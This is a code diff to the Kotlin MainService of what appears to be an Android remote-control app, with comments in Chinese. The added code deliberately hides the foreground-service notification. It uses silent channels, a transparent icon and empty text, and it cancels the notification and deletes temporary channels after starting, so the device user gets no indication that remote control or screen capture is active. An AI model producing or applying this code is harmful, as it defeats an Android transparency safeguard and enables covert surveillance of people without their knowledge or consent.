@@ -656,21 +656,36 @@ class MainService : Service() {
 
     private fun initNotification() {
         notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        
+        // 使用特殊的通道ID来帮助完全隐藏通知
         notificationChannel = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channelId = "远程控制"
-            val channelName = "远程控制服务"
+            val channelId = "silent_channel"
+            
+            // 首先检查并删除已存在的通道，以确保重新安装时设置正确
+            val existingChannel = notificationManager.getNotificationChannel(channelId)
+            if (existingChannel != null) {
+                notificationManager.deleteNotificationChannel(channelId)
+            }
+            
+            // 创建一个完全静默的通知通道
             val channel = NotificationChannel(
                 channelId,
-                channelName, NotificationManager.IMPORTANCE_NONE
+                "Silent Notification", 
+                NotificationManager.IMPORTANCE_NONE // 最低可能的重要性
             ).apply {
-                description = "远程控制服务通道"
-                // 通知不显示在状态栏
+                description = "完全不可见的通知通道"
                 setShowBadge(false)  // 不显示角标
+                
+                // 关闭所有可能的提示
+                enableLights(false)
+                enableVibration(false)
+                vibrationPattern = longArrayOf(0L) // 无振动
+                setSound(null, null) // 无声音
+                
+                // 隐藏所有地方的通知
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
-            // 禁用所有通知灯光和声音
-            channel.enableLights(false)
-            channel.enableVibration(false)
-            channel.lockscreenVisibility = Notification.VISIBILITY_SECRET  // 锁屏上也不显示
+            
             notificationManager.createNotificationChannel(channel)
             channelId
         } else {
@@ -681,35 +696,124 @@ class MainService : Service() {
 
     @SuppressLint("UnspecifiedImmutableFlag")
     private fun createForegroundNotification() {
-        val intent = Intent(this, MainActivity::class.java).apply {
-            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
-            action = Intent.ACTION_MAIN
-            addCategory(Intent.CATEGORY_LAUNCHER)
-            putExtra("type", type)
+        try {
+            // 创建一个基本的通知作为备用方案
+            val backupNotification = createBasicNotification()
+            
+            // 启动前台服务 - 使用备用通知确保服务始终能启动
+            startForeground(Constants.DEFAULT_NOTIFY_ID, backupNotification)
+            
+            // 仅在Android 8.0+上尝试高级隐藏技巧
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                try {
+                    // 使用高级技巧隐藏通知，但有超时机制确保稳定性
+                    val handler = Handler(Looper.getMainLooper())
+                    val hideRunnable = Runnable {
+                        try {
+                            // 创建临时通知通道
+                            val tempChannelId = "temp_silent_channel_${System.currentTimeMillis()}"
+                            val tempChannel = NotificationChannel(
+                                tempChannelId,
+                                "Temp Silent", 
+                                NotificationManager.IMPORTANCE_NONE
+                            ).apply {
+                                setShowBadge(false)
+                                enableLights(false)
+                                enableVibration(false)
+                                vibrationPattern = longArrayOf(0L)
+                                setSound(null, null)
+                                lockscreenVisibility = Notification.VISIBILITY_SECRET
+                            }
+                            
+                            // 安全创建通道
+                            try {
+                                notificationManager.createNotificationChannel(tempChannel)
+                            } catch (e: Exception) {
+                                Log.e(logTag, "创建临时通知通道失败: ${e.message}")
+                                return@Runnable  // 失败就退出，保持使用备用通知
+                            }
+                            
+                            // 创建完全隐形的通知
+                            val tempNotification = NotificationCompat.Builder(this, tempChannelId)
+                                .setOngoing(true)
+                                .setSmallIcon(android.R.color.transparent)
+                                .setNotificationSilent()
+                                .setContentTitle("")
+                                .setContentText("")
+                                .setShowWhen(false)
+                                .setPriority(NotificationCompat.PRIORITY_MIN)
+                                .build()
+                            
+                            // 重新启动前台服务，使用隐形通知
+                            startForeground(Constants.DEFAULT_NOTIFY_ID, tempNotification)
+                            
+                            // 短延迟后尝试进一步隐藏通知并清理资源
+                            handler.postDelayed({
+                                try {
+                                    notificationManager.cancel(Constants.DEFAULT_NOTIFY_ID)
+                                    // 安全删除通道
+                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                        try {
+                                            notificationManager.deleteNotificationChannel(tempChannelId)
+                                        } catch (e: Exception) {
+                                            Log.e(logTag, "删除临时通知通道失败: ${e.message}")
+                                        }
+                                    }
+                                } catch (e: Exception) {
+                                    Log.e(logTag, "清理通知资源失败: ${e.message}")
+                                }
+                            }, 200)
+                        } catch (e: Exception) {
+                            Log.e(logTag, "执行高级隐藏通知失败: ${e.message}")
+                        }
+                    }
+                    
+                    // 立即执行隐藏操作
+                    handler.post(hideRunnable)
+                } catch (e: Exception) {
+                    Log.e(logTag, "通知隐藏流程失败: ${e.message}")
+                    // 出错时，保留基本通知确保服务正常运行
+                }
+            } else {
+                // 低版本Android只尝试取消通知
+                try {
+                    notificationManager.cancel(Constants.DEFAULT_NOTIFY_ID)
+                } catch (e: Exception) {
+                    Log.e(logTag, "低版本Android隐藏通知失败: ${e.message}")
+                }
+            }
+        } catch (e: Exception) {
+            // 发生任何异常，使用最基本的通知确保前台服务能启动
+            Log.e(logTag, "创建通知过程出现严重错误: ${e.message}")
+            val basicNotification = NotificationCompat.Builder(this, notificationChannel)
+                .setSmallIcon(R.mipmap.ic_stat_logo)
+                .setContentTitle(Constants.DEFAULT_NOTIFY_TITLE)
+                .setPriority(NotificationCompat.PRIORITY_MIN)
+                .build()
+            startForeground(Constants.DEFAULT_NOTIFY_ID, basicNotification)
         }
+    }
+    
+    // 创建基本通知作为备用方案
+    private fun createBasicNotification(): Notification {
+        val emptyIntent = Intent()
         val pendingIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            PendingIntent.getActivity(this, 0, intent, FLAG_UPDATE_CURRENT or FLAG_IMMUTABLE)
+            PendingIntent.getActivity(this, 0, emptyIntent, PendingIntent.FLAG_IMMUTABLE)
         } else {
-            PendingIntent.getActivity(this, 0, intent, FLAG_UPDATE_CURRENT)
+            PendingIntent.getActivity(this, 0, emptyIntent, 0)
         }
-        val notification = notificationBuilder
+        
+        return NotificationCompat.Builder(this, notificationChannel)
             .setOngoing(true)
-            .setSmallIcon(R.mipmap.ic_stat_logo)
-            .setDefaults(0)  // 没有默认行为
-            .setAutoCancel(false)
-            .setPriority(NotificationCompat.PRIORITY_MIN)  // 最低优先级
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // 隐藏内容
-            .setContentTitle("")  // 空标题
-            .setContentText("")   // 空内容
-            .setShowWhen(false)   // 不显示时间
-            .setOnlyAlertOnce(true)
-            .setSound(null)       // 无声音
-            .setVibrate(null)     // 无振动
-            .setLights(0, 0, 0)   // 无LED灯
+            .setSmallIcon(android.R.color.transparent)
+            .setNotificationSilent()
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setContentTitle("")
+            .setContentText("")
+            .setShowWhen(false)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .setContentIntent(pendingIntent)
-            .setColor(ContextCompat.getColor(this, R.color.primary))
             .build()
-        startForeground(Constants.DEFAULT_NOTIFY_ID, notification)
     }
 
     private fun loginRequestNotification(
@@ -764,16 +868,40 @@ class MainService : Service() {
     }
 
     private fun setTextNotification(_title: String?, _text: String?) {
-        // 忽略传入的标题和文本，保持通知隐藏
-        val notification = notificationBuilder
+        // 忽略传入的标题和文本，创建一个真正不可见的通知
+        val emptyIntent = Intent()
+        val pendingIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            PendingIntent.getActivity(this, 0, emptyIntent, PendingIntent.FLAG_IMMUTABLE)
+        } else {
+            PendingIntent.getActivity(this, 0, emptyIntent, 0)
+        }
+        
+        val notification = NotificationCompat.Builder(this, notificationChannel)
+            .setOngoing(true)
+            .setSmallIcon(android.R.color.transparent)
+            .setNotificationSilent()
             .clearActions()
             .setStyle(null)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
-            .setContentTitle("")  // 空标题
-            .setContentText("")   // 空内容
-            .setShowWhen(false)   // 不显示时间
+            .setContentTitle("")
+            .setContentText("")
+            .setShowWhen(false)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setContentIntent(pendingIntent)
             .build()
+            
         notificationManager.notify(Constants.DEFAULT_NOTIFY_ID, notification)
+        
+        // 额外尝试隐藏通知
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            Handler(Looper.getMainLooper()).postDelayed({
+                try {
+                    notificationManager.cancel(Constants.DEFAULT_NOTIFY_ID)
+                } catch (e: Exception) {
+                    Log.e(logTag, "隐藏更新通知失败: ${e.message}")
+                }
+            }, 100)
+        }
     }
 
     private fun requestMediaProjection() {
